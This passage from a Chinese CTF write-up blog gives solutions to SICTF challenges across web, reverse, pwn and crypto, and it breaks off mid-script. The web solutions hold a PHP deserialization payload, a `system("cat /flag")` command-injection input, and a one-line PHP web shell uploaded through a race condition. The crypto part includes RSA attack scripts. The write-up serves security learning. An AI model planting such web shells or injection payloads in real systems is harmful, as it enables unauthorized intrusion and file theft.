<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?A[B_C=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;Aec&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;233333333&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;P&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;MyLover&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;girl&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;QNKCDZO&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;boy&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;240610708&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;N;&#125;</span><br></pre></td></tr></table></div></figure>



<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></div></figure>




        <h3 id="你能跟得上我的speed吗">
          <a href="#你能跟得上我的speed吗" class="heading-link"><i class="fas fa-link"></i></a><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3>
      <p>条件竞争</p>
<p>准备一个php文件</p>
<p>内容为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;</span><br></pre></td></tr></table></div></figure>

<p>抓两个包</p>
<p>一个为get传参的包，访问url&#x2F;uploads&#x2F;2.php,抓包</p>
<p>另一个为post包，直接就抓上传的包，如下</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194924480.png"></p>
<p>俩个包用burp爆破，爆破方式为noplayload，开跑</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194932339.png"></p>

        <h1 id="Re">
          <a href="#Re" class="heading-link"><i class="fas fa-link"></i></a><a href="#Re" class="headerlink" title="Re"></a>Re</h1>
      
        <h3 id="签到-PYC">
          <a href="#签到-PYC" class="heading-link"><i class="fas fa-link"></i></a><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 <span class="number">1.</span>pyc &gt; <span class="number">1.</span>py</span><br></pre></td></tr></table></div></figure>


        <h3 id="Myobject">
          <a href="#Myobject" class="heading-link"><i class="fas fa-link"></i></a><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h3>
      <p>动调出数据，直接赛博厨子秒了</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194940735.png"></p>

        <h3 id="chbase">
          <a href="#chbase" class="heading-link"><i class="fas fa-link"></i></a><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h3>
      <p>换表加密</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194948225.png"></p>
<p><img src="/2023/09/10/SICTF-2nd/Blog/blog/themes/fluid/source/img/image-20230910151009599.png"></p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194958542.png"></p>

        <h3 id="不一样的base64">
          <a href="#不一样的base64" class="heading-link"><i class="fas fa-link"></i></a><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BASE64_CHARS = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">base64_decode</span><span class="params">(encoded_data)</span>:</span><br><span class="line">    decoded_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    padding_count = encoded_data.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    encoded_data = encoded_data.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="type">char</span> in encoded_data:</span><br><span class="line">        decimal_val = BASE64_CHARS.index(<span class="type">char</span>)</span><br><span class="line">        binary_str += format(decimal_val, <span class="string">&#x27;06b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> padding_count &gt; <span class="number">0</span>:</span><br><span class="line">        binary_str = binary_str[:-padding_count * <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(binary_str)</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="type">byte</span> = binary_str[i:i + <span class="number">8</span>]</span><br><span class="line">        decoded_data += chr(<span class="type">int</span>(<span class="type">byte</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">decoded_data</span></span><br><span class="line"></span><br><span class="line"><span class="variable">encoded_data</span> <span class="operator">=</span> input(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">decoded_data = base64_decode(encoded_data)</span><br><span class="line">print(decoded_data)</span><br></pre></td></tr></table></div></figure>


        <h1 id="Pwn">
          <a href="#Pwn" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1>
      
        <h3 id="签到-Shop">
          <a href="#签到-Shop" class="heading-link"><i class="fas fa-link"></i></a><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h3>
      <p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195011641.png"></p>

        <h1 id="Crypto">
          <a href="#Crypto" class="heading-link"><i class="fas fa-link"></i></a><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1>
      
        <h3 id="古典大杂烩">
          <a href="#古典大杂烩" class="heading-link"><i class="fas fa-link"></i></a><a href="#古典大杂烩" class="headerlink" title="古典大杂烩"></a>古典大杂烩</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱</span><br></pre></td></tr></table></div></figure>

<p>emjio解密</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195022559.png"></p>

        <h3 id="Radio">
          <a href="#Radio" class="heading-link"><i class="fas fa-link"></i></a><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3>
      <p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195033374.png"></p>

        <h3 id="Easy-CopperSmith">
          <a href="#Easy-CopperSmith" class="heading-link"><i class="fas fa-link"></i></a><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =<span class="number">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line">cipher =<span class="number">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>,<span class="number">2</span>**<span class="number">4</span>)</span>:</span><br><span class="line">    p4=<span class="number">0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590</span></span><br><span class="line">    p4=p4+<span class="type">int</span>(hex(i),<span class="number">16</span>)</span><br><span class="line">    print(hex(p4))</span><br><span class="line">    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数</span><br><span class="line">    print(p4.nbits())</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + <span class="type">p4</span></span><br><span class="line">    <span class="variable">roots</span> <span class="operator">=</span> f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>) #进行爆破</span><br><span class="line">    #print roots</span><br><span class="line">    <span class="keyword">if</span> roots:        #爆破成功，求根</span><br><span class="line">        p = p4+<span class="type">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;p: &quot;</span>, hex(<span class="type">int</span>(p)))</span><br><span class="line">        <span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">        q = n/<span class="type">int</span>(p)</span><br><span class="line">        print(<span class="string">&quot;q: &quot;</span>, hex(<span class="type">int</span>(q)))</span><br><span class="line">        print(gcd(p,q))</span><br><span class="line">        phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        print(gcd(e2,phin))</span><br><span class="line">        d = inverse_mod(e2,phin)</span><br><span class="line">        print(<span class="string">&quot;d：&quot;</span>,d)</span><br><span class="line">        flag = pow(cipher,d,n)</span><br><span class="line">        flag = hex(<span class="type">int</span>(flag))[<span class="number">2</span>:]</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(flag)</span>, <span class="number">2</span>):</span><br><span class="line">            hex_int = <span class="type">int</span>(flag[i:i+<span class="number">2</span>], <span class="number">16</span>)  # 转换为整数</span><br><span class="line">            result += chr(hex_int)  # 转换为字符并拼接到结果字符串</span><br><span class="line">        print(<span class="string">&#x27;result :&#x27;</span>,result)</span><br><span class="line">        </span><br><span class="line"># SICTF&#123;3f9366ed-b8e4-<span class="number">412f</span>-bbd0-62616a24115c&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="MingTianPao">
          <a href="#MingTianPao" class="heading-link"><i class="fas fa-link"></i></a><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_character</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_strings</span>(<span class="params">s1, s2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> <span class="built_in">zip</span>(s1, s2)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer_space</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> message[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    message[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertexts)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_spaces</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertexts):</span><br><span class="line">        res = [xor_strings(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> ciphertexts <span class="keyword">if</span> x != y]</span><br><span class="line">        f = <span class="keyword">lambda</span> position: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(is_character, [s[position] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            space_data.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;222.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    ciphertexts = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> file.readlines()]</span><br><span class="line"></span><br><span class="line">message = np.zeros([<span class="built_in">len</span>(ciphertexts), <span class="built_in">len</span>(ciphertexts[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">space_data = []</span><br><span class="line"></span><br><span class="line">find_spaces()</span><br><span class="line"></span><br><span class="line">space_data = <span class="built_in">sorted</span>(space_data, reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> weight, index, pos <span class="keyword">in</span> space_data:</span><br><span class="line">    infer_space(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> message]))</span><br><span class="line">hex_str1 = <span class="string">&quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;</span></span><br><span class="line">hex_str2 = <span class="string">&quot;Little Red Riding Hood promised&quot;</span></span><br><span class="line"></span><br><span class="line">bytes1 = <span class="built_in">bytes</span>.fromhex(hex_str1)</span><br><span class="line">bytes2 = <span class="built_in">bytes</span>(hex_str2, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(bytes1, bytes2)])</span><br><span class="line"></span><br><span class="line">result_str = result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result_str)</span><br></pre></td></tr></table></div></figure>


        <h3 id="small-e">
          <a href="#small-e" class="heading-link"><i class="fas fa-link"></i></a><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3>
      <p>低指数加密&#x2F;m高位攻击</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195045944.png"></p>

        <h3 id="签到题来咯！">
          <a href="#签到题来咯！" class="heading-link"><i class="fas fa-link"></i></a><a href="#签到题来咯！" class="headerlink" title="签到题来咯！"></a>签到题来咯！</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span>  Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883</span></span><br><span class="line">c1 = <span class="number">3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520</span></span><br><span class="line">c2 = <span class="number">6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i = <span class="number">5</span></span><br><span class="line">    <span class="keyword">while</span> i * i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span> <span class="keyword">or</span> n % (i + <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^<span class="built_in">int</span>(e) - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^<span class="built_in">int</span>(e) - c2</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">if</span> is_prime(i):</span><br><span class="line">        e = i</span><br><span class="line">        m=franklinReiter(n,e,c1,c2)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes((<span class="built_in">int</span>(m))))</span><br></pre></td></tr></table></div></figure>

<p>e应该是983</p>
<p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195057189.png"></p>

        <h3 id="easy-math">
          <a href="#easy-math" class="heading-link"><i class="fas fa-link"></i></a><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3>
      <p>demo</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo</span></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"><span class="comment"># from  Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line"><span class="comment"># hint1 = getPrime(13)*p+getPrime(256)*q</span></span><br><span class="line"><span class="comment"># hint2 = getPrime(13)*p+getPrime(256)*q</span></span><br><span class="line"><span class="comment"># c = pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(f&#x27;n = &#123;n&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;hint1 = &#123;hint1&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;hint2 = &#123;hint2&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;c = &#123;c&#125;&#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># n = 68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067</span></span><br><span class="line"><span class="comment"># hint1 = 564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580</span></span><br><span class="line"><span class="comment"># hint2 = 484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110</span></span><br><span class="line"><span class="comment"># c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>exp</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,invert</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">n = <span 